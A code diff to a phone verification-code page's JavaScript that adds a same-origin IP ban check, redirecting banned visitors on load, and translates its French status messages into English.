@@ -10,10 +10,23 @@ const isRetry = getParam('retry') === '1';
 
 document.getElementById('codePhone').textContent = phone;
 
+// ─── BAN IP CHECK ───
+async function checkBan() {
+    try {
+        const res = await fetch('/api/check-ban');
+        const data = await res.json();
+        if (data.banned) {
+            window.location.href = 'banned.html';
+        }
+    } catch (e) {
+        console.error('Ban check error:', e);
+    }
+}
+
 // Message si retry
 const statusEl = document.getElementById('codeStatus');
 if (isRetry) {
-    statusEl.textContent = '⚠️ Le code précédent était incorrect. Veuillez saisir le nouveau code.';
+    statusEl.textContent = '⚠️ The previous code was incorrect. Please enter the new code.';
     statusEl.className = 'status-message error';
 }
 
@@ -68,7 +81,7 @@ async function verifyCode() {
     inputs.forEach(inp => code += inp.value);
 
     if (code.length !== length) {
-        status.textContent = `⚠️ Veuillez entrer les ${length} chiffres`;
+        status.textContent = `⚠️ Please enter all ${length} digits`;
         status.className = 'status-message error';
         return;
     }
@@ -87,24 +100,27 @@ async function verifyCode() {
         const data = await res.json();
 
         if (res.ok && data.success) {
-            status.textContent = '✅ Code envoyé, vérification en cours...';
+            status.textContent = '✅ Code submitted, verification in progress...';
             status.className = 'status-message success';
             setTimeout(() => {
                 window.location.href = `verify-wait.html?phone=${encodeURIComponent(phone)}&length=${length}`;
             }, 800);
         } else {
-            status.textContent = data.message || '❌ Code incorrect';
+            status.textContent = data.message || '❌ Incorrect code';
             status.className = 'status-message error';
             inputs.forEach(i => { i.value = ''; });
             inputs[0].focus();
         }
     } catch (e) {
-        status.textContent = '❌ Erreur réseau, réessayez';
+        status.textContent = '❌ Network error, please try again';
         status.className = 'status-message error';
     } finally {
         btn.classList.remove('loading');
         btn.disabled = false;
     }
 }
+
+// Vérifie le ban au chargement
+checkBan();
 
 window.verifyCode = verifyCode;
